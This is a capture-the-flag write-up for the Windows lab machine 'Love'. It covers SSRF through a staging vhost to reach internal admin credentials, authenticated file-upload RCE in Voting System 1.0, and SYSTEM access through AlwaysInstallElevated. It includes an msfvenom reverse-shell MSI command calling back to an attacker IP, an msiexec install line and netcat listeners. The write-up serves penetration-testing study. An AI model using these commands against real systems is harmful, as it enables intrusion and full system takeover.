#Windows #SSRF #VotingSystem #CVE #FileUpload #RCE #AlwaysInstallElevated #msfvenom

## Overview

Love is an easy Windows box that opens with **SSRF**. A staging site lets me fetch arbitrary URLs server-side, which I use to read an internal-only service that leaks admin credentials. Those log into a Voting System app vulnerable to authenticated file-upload RCE, and root is the **AlwaysInstallElevated** misconfiguration, an MSI installed as SYSTEM.

## Recon

The HTTPS certificate leaked names and a vhost:

```
roy@love.htb, love.htb, ValentineCorp, staging.love.htb
```

`staging.love.htb` hosts a different site with a "scan a URL" feature.

## Foothold

### SSRF → Internal Credentials

The staging site fetches whatever URL you give it, server-side.

> **Why that's SSRF:** the server makes the request, not your browser. So it can reach services bound to localhost or internal ports that you can't hit directly. Pointing it at the box's own internal port surfaces an admin dashboard meant to be private.

Aiming it at the internal service on port 5000 returned a password dashboard exposing the voting app's admin credentials:

```
Vote Admin Creds  ->  admin : ‹redacted›
```

### Voting System 1.0, Authenticated File Upload RCE

Those creds logged into `http://love.htb/admin`. Voting System 1.0 has an [authenticated upload RCE](https://www.exploit-db.com/exploits/49445), it accepts a PHP file disguised as a voter image and serves it back executable. I set my IP/creds in the script and ran it:

```sh
rlwrap nc -lvnp 53
C:\xampp\htdocs\omrs\images>whoami
love\phoebe
```

## Privilege Escalation

### AlwaysInstallElevated

WinPEAS flagged **AlwaysInstallElevated** enabled.

> **What it is:** two registry policies (HKLM + HKCU) that, when both set, tell Windows Installer to run *any* MSI with SYSTEM privileges, even when launched by a normal user. It exists for deployment convenience and is a straight path to SYSTEM. I just need a malicious MSI.

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.92 LPORT=443 -f msi > rev.msi
```

```cmd
msiexec /quiet /qn /i rev.msi
```

```sh
rlwrap nc -lvnp 443
C:\WINDOWS\system32>whoami
nt authority\system
```

## Root

Box rooted.

## Takeaways

- **Certificates leak infrastructure**, the `staging.` vhost came straight off the TLS cert.
- **SSRF reaches what you can't.** A server-side fetch to `localhost:5000` exposed credentials bound to an internal-only dashboard.
- **AlwaysInstallElevated is a free SYSTEM** when both registry keys are set, generate an MSI and `msiexec` it.
